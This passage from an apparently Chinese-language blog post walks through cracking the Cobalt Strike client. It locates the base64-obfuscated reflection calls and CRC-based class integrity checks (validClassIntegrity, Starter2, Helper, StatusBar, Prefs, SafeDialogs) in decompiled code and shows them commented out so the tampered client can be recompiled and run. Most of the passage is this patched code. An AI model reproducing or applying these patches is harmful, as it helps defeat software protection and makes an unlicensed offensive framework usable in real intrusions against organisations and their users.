string">"dmFsaWRDbGFzc0ludGVncml0eQ=="</span><span class="token punctuation">;</span> <span class="token comment">//validClassIntegrity</span>            <span class="token class-name">Class</span> var6 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>                var6 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">(</span>var3<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token class-name">Class</span> var7 <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">(</span>var4<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                var2 <span class="token operator">=</span> var6<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token class-name">A</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">,</span> var7<span class="token punctuation">,</span> var7<span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">,</span> <span class="token class-name">Long</span><span class="token punctuation">.</span>TYPE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//common.CommonUtils.validClassIntegrity</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var10<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkNvbW1vblV0aWxz"</span><span class="token punctuation">,</span> <span class="token number">395936014L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.CommonUtils</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkF1dGhvcml6YXRpb24="</span><span class="token punctuation">,</span> <span class="token number">1655604415L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.Authorization</span>            <span class="token keyword">long</span> var11 <span class="token operator">=</span> <span class="token number">895661977L</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> var9 <span class="token operator">=</span> <span class="token string">"Y29tbW9uLkF1dGhDcnlwdG8="</span><span class="token punctuation">;</span> <span class="token comment">//common.AuthCrypto</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var11<span class="token punctuation">)</span><span class="token punctuation">;</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> var9<span class="token punctuation">,</span> var11 <span class="token operator">+</span> <span class="token number">1L</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkRhdGFQYXJzZXI="</span><span class="token punctuation">,</span> <span class="token number">2488344227L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.DataParser</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLlNsZWV2ZWRSZXNvdXJjZQ=="</span><span class="token punctuation">,</span> <span class="token number">3881376138L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.SleevedResource</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"ZG5zLlNsZWV2ZVNlY3VyaXR5"</span><span class="token punctuation">,</span> <span class="token number">3962922538L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//dns.SleeveSecurity</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"YWdncmVzc29yLkFnZ3Jlc3Nvcg=="</span><span class="token punctuation">,</span> <span class="token number">105727981L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//aggressor.Aggressor</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLkFnZ3Jlc3NvckluZm8="</span><span class="token punctuation">,</span> <span class="token number">1814321826L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.AggressorInfo</span>            var1 <span class="token operator">=</span> var1 <span class="token operator">&amp;&amp;</span> <span class="token class-name">A</span><span class="token punctuation">(</span>var2<span class="token punctuation">,</span> var0<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"Y29tbW9uLlN0YXJ0ZXI="</span><span class="token punctuation">,</span> <span class="token number">541000743L</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//common.Starter</span>            <span class="token keyword">return</span> var1<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>          <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">String</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">String</span> var0<span class="token punctuation">,</span> <span class="token class-name">String</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//base64编码</span>         <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>``` java我们推测这个应该就是检测点我们还是老样子去反编译源码中复制一波变成了csproject\src\aggressor\ui\<span class="token class-name">UseLookAndFeel</span><span class="token punctuation">.</span>java 修改一波代码。重新编译看看``` java       <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">adjustments</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">A</span><span class="token punctuation">(</span>var0<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"check adjustments!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>         <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span></code></pre><p>说明是这个点<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101903954.png" alt="如图"><br>   var2 &#x3D; var6.getDeclaredMethod(A(var5, “”), var7, var7, Boolean.TYPE, Long.TYPE);&#x2F;&#x2F;common.CommonUtils.validClassIntegrity<br>使用反射利用 validClassIntegrity 校验类是否被改 </p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">validClassIntegrity</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">,</span> <span class="token keyword">boolean</span> var2<span class="token punctuation">,</span> <span class="token keyword">long</span> var3<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">ZipFile</span> var5 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">boolean</span> var6<span class="token punctuation">;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       var5 <span class="token operator">=</span> <span class="token function">openZip</span><span class="token punctuation">(</span>var0<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">long</span> var18 <span class="token operator">=</span> <span class="token function">getClassCRC</span><span class="token punctuation">(</span>var5<span class="token punctuation">,</span> var1<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">boolean</span> var8 <span class="token operator">=</span> var3 <span class="token operator">==</span> var18<span class="token punctuation">;</span>          <span class="token keyword">return</span> var8<span class="token punctuation">;</span>       <span class="token punctuation">&#125;</span>       var6 <span class="token operator">=</span> var2<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">finally</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>var5 <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>             var5<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var16<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token punctuation">&#125;</span>       <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> var6<span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">long</span> <span class="token function">getClassCRC</span><span class="token punctuation">(</span><span class="token class-name">ZipFile</span> var0<span class="token punctuation">,</span> <span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>       <span class="token class-name">String</span> var2 <span class="token operator">=</span> <span class="token function">convertClassToFileName</span><span class="token punctuation">(</span>var1<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token class-name">ZipEntry</span> var3 <span class="token operator">=</span> var0<span class="token punctuation">.</span><span class="token function">getEntry</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token keyword">return</span> var3 <span class="token operator">!=</span> <span class="token keyword">null</span> <span class="token operator">?</span> var3<span class="token punctuation">.</span><span class="token function">getCrc</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Throwable</span> var4<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1L</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></code></pre><p>我们之计copy common.CommonUtils 在validClassIntegrity函数加上 System.out.println(“crc checking class “+var0.getName()+” | “+var1.getName());<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101926994.png" alt="如图"><br>验证了我猜想使用 common.CommonUtils 的在validClassIntegrity函数 验证 aggressor.MultiFrame 的完整性所以直接注释掉</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token comment">/*         Method var2 = null;         String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";         String var4 = "amF2YS5sYW5nLkNsYXNz";         String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";         Class var6 = null;         try &#123;            var6 = Class.forName(A(var3, ""));            Class var7 = Class.forName(A(var4, ""));            var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);         &#125; catch (Throwable var10) &#123;            System.exit(1);         &#125;         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkNvbW1vblV0aWxz", 395936014L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkF1dGhvcml6YXRpb24=", 1655604415L);         long var11 = 895661977L;         String var9 = "Y29tbW9uLkF1dGhDcnlwdG8=";         var1 = var1 &amp;&amp; A(var2, var0, false, var9, var11);         var1 = var1 &amp;&amp; !A(var2, var0, false, var9, var11 + 1L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkRhdGFQYXJzZXI=", 2488344227L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLlNsZWV2ZWRSZXNvdXJjZQ==", 3881376138L);         var1 = var1 &amp;&amp; A(var2, var0, false, "ZG5zLlNsZWV2ZVNlY3VyaXR5", 3962922538L);         var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLkFnZ3Jlc3Nvcg==", 105727981L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLkFnZ3Jlc3NvckluZm8=", 1814321826L);         var1 = var1 &amp;&amp; A(var2, var0, false, "Y29tbW9uLlN0YXJ0ZXI=", 541000743L);         */</span>                   <span class="token keyword">return</span> var1<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span></code></pre><p>编译运行我们发现又退出了如下图。所以那就是  (new ConnectDialog(A)).show(); 代码有验证<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101934301.png" alt="如图"></p><pre class="language-java" data-language="java"><code class="language-java">\csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\aggressor\dialogs\<span class="token class-name">ConnectDialog</span><span class="token punctuation">.</span><span class="token keyword">class</span>  <span class="token keyword">public</span> <span class="token class-name">ConnectDialog</span><span class="token punctuation">(</span><span class="token class-name">MultiFrame</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>window <span class="token operator">=</span> var1<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>useAliasName <span class="token operator">=</span> <span class="token class-name">Prefs</span><span class="token punctuation">.</span><span class="token function">getPreferences</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isSet</span><span class="token punctuation">(</span><span class="token string">"connection.view.alias.boolean"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">super</span><span class="token punctuation">.</span><span class="token function">initialize</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>我们看到了<span class="token keyword">super</span>就是他的父类存在这个函数 <span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConnectDialog</span> <span class="token keyword">extends</span> <span class="token class-name">Starter2</span> 那就是 <span class="token class-name">Starter2</span> \csproject\lib\cobaltstrike<span class="token operator">-</span>client<span class="token punctuation">.</span>jar<span class="token operator">!</span>\common\<span class="token class-name">Starter2</span><span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token keyword">protected</span> <span class="token keyword">final</span> <span class="token keyword">void</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span>var1<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token class-name">Class</span> var3 <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>      var3 <span class="token operator">=</span> <span class="token class-name">Starter</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      <span class="token class-name">String</span> var4 <span class="token operator">=</span> <span class="token string">"common/Starter.class"</span><span class="token punctuation">;</span>      <span class="token keyword">long</span><span class="token punctuation">[</span><span class="token punctuation">]</span> var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      var3 <span class="token operator">=</span> <span class="token class-name">Initializer</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      var4 <span class="token operator">=</span> <span class="token string">"common/Initializer.class"</span><span class="token punctuation">;</span>      var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      var3 <span class="token operator">=</span> <span class="token class-name">Aggressor</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      var4 <span class="token operator">=</span> <span class="token string">"aggressor/Aggressor.class"</span><span class="token punctuation">;</span>      var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      var3 <span class="token operator">=</span> <span class="token class-name">AggressorInfo</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">;</span>      var4 <span class="token operator">=</span> <span class="token string">"common/AggressorInfo.class"</span><span class="token punctuation">;</span>      var5 <span class="token operator">=</span> <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>A</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">Object</span><span class="token punctuation">)</span>var3<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name">B</span><span class="token punctuation">(</span>var1<span class="token punctuation">,</span> var3<span class="token punctuation">,</span> var4<span class="token punctuation">,</span> var5<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         var2 <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span></code></pre><p>老规矩复制一波 注释掉验证函数</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">//修改一波</span>      <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token comment">/*      Class var3 = null;      var3 = Starter.class;      String var4 = "common/Starter.class";      long[] var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = Initializer.class;      var4 = "common/Initializer.class";      var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = Aggressor.class;      var4 = "aggressor/Aggressor.class";      var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = AggressorInfo.class;      var4 = "common/AggressorInfo.class";      var5 = this.A((Object)var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;*/</span>      <span class="token keyword">return</span> var2<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>按照他这个套路在反编译源码中我们搜索一下 common&#x2F;<br>\csproject\src\common\Helper.java</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501101958549.png" alt="看图"></p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token function">startHelper</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var1<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">boolean</span> var2 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>      <span class="token comment">/*      Class var3 = null;      var3 = Starter2.class;      String var4 = "common/Starter2.class";      long[] var5 = this.getHelpID(var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      var3 = ConnectDialog.class;      var4 = "aggressor/dialogs/ConnectDialog.class";      var5 = this.getHelpID(var3);      if (!B(var1, var3, var4, var5, true)) &#123;         var2 = false;      &#125;      */</span>            <span class="token keyword">return</span> var2<span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>我们再次搜索 Y29tbW9uLkNvbW1vblV0aWxz<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202501102032267.png" alt="搜索"><br>csproject\src\console\StatusBar.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">/*        Method var2 = null;        String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";        String var4 = "amF2YS5sYW5nLkNsYXNz";        String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";        Class var6 = null;        try &#123;           var6 = Class.forName(A(var3, ""));           Class var7 = Class.forName(A(var4, ""));           var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);        &#125; catch (Throwable var8) &#123;           System.exit(1);        &#125;        var1 = var1 &amp;&amp; A(var2, var0, false, "ZGlhbG9nLlNhZmVEaWFsb2dzJFNhZmV0eUNoZWNr", 2543265740L);        var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLmJyb3dzZXJzLkNyZWRlbnRpYWxz", 3889907850L);        var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLmJyb3dzZXJzLlRhcmdldHM=", 3853403163L);        */</span>        <span class="token keyword">return</span> var1<span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span></code></pre><p>csproject\src\aggressor\Prefs.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>       <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>       <span class="token comment">/*       Method var2 = null;       String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";       String var4 = "amF2YS5sYW5nLkNsYXNz";       String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";       Class var6 = null;       try &#123;          var6 = Class.forName(A(var3, ""));          Class var7 = Class.forName(A(var4, ""));          var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);       &#125; catch (Throwable var8) &#123;          System.exit(1);       &#125;       var1 = var1 &amp;&amp; A(var2, var0, false, "Y29uc29sZS5TdGF0dXNCYXIkU3RhdHVzQmFySGVscGVy", 482118951L);       var1 = var1 &amp;&amp; A(var2, var0, false, "Z3JhcGguTmV0d29ya0dyYXBo", 3864160077L);        */</span>       <span class="token keyword">return</span> var1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span></code></pre><p>csproject\src\dialog\SafeDialogs.java</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">boolean</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token class-name">Class</span> var0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">boolean</span> var1 <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token comment">/*        Method var2 = null;        String var3 = "Y29tbW9uLkNvbW1vblV0aWxz";        String var4 = "amF2YS5sYW5nLkNsYXNz";        String var5 = "dmFsaWRDbGFzc0ludGVncml0eQ==";        Class var6 = null;        try &#123;           var6 = Class.forName(A(var3, ""));           Class var7 = Class.forName(A(var4, ""));           var2 = var6.getDeclaredMethod(A(var5, ""), var7, var7, Boolean.TYPE, Long.TYPE);        &#125; catch (Throwable var10) &#123;           System.exit(1);        &#125;        var1 = var1 &amp;&amp; A(var2, var0, false, "YWdncmVzc29yLnVpLlVzZUxvb2tBbmRGZWVsJExvb2tBbmRGZWVsTWFuYWdlcg==", 684737157L);        long var11 = 942042510L;        String var9 = "YWdncmVzc29yLk11bHRpRnJhbWU=";        var1 = var1 &amp;&amp; !A(var2, var0, false, var9, var11 + 1L);        var1 = var1 &amp;&amp; A(var2, var0, false, var9, var11);        var1 = var1 &amp;&amp; A(var2, var0, false, "ZGlhbG9nLkFjdGl2aXR5UGFuZWw=", 3600095813L);         */</span>        <span class="token keyword">return</span> var1<span class="token punctuation">;</span>     <span class="token 